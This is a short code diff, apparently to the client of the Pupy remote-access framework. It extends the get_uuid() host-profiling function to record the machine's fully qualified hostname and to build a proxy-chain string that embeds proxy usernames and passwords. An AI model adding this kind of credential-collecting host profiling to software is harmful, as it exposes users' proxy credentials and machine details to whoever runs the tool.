@@ -7,6 +7,7 @@ import sys
 import os
 import locale
 import logging
+import socket
 import pupy
 
 import encodings
@@ -262,6 +263,7 @@ def get_uuid():
 
     uacLevel = None
     integrity_level = None
+
     try:
         if sys.platform=="win32":
             user = GetUserName().encode("utf8")
@@ -272,7 +274,6 @@ def get_uuid():
     except Exception as e:
         logging.exception(e)
         user='?'
-        pass
 
     try:
         hostname = platform.node().decode(
@@ -282,6 +283,13 @@ def get_uuid():
         if sys.platform == 'win32' and user.startswith(hostname + '\\'):
             user = user.split('\\', 1)[1]
 
+    except Exception:
+        pass
+
+    try:
+        hostname = socket.getfqdn().lower()
+        if hostname.endswith(('.localdomain', '.localhost')):
+            hostname, _ = hostname.rsplit('.', 1)
     except Exception:
         pass
 
@@ -378,12 +386,28 @@ def get_uuid():
     proxy = None
     try:
         from network.lib.proxies import LAST_PROXY, has_wpad
-        if LAST_PROXY:
+        if hasattr(pupy, 'client') and pupy.client.connection_info.get(
+                'proxies', []):
+            try:
+                proxy = ' -> '.join(
+                    '{}://{}{}'.format(
+                        proxy.type,
+                        '{}:{}@'.format(
+                            proxy.username, proxy.password
+                        ) if proxy.username or proxy.password else '',
+                        proxy.addr
+                    ) for proxy in pupy.client.connection_info['proxies']
+                )
+            except Exception as e:
+                proxy = str(e)
+
+        elif LAST_PROXY:
             proxy = tuple([
                 x for x in LAST_PROXY if x
             ])
         elif has_wpad:
             proxy = 'wpad'
+
     except ImportError:
         proxy = None
 
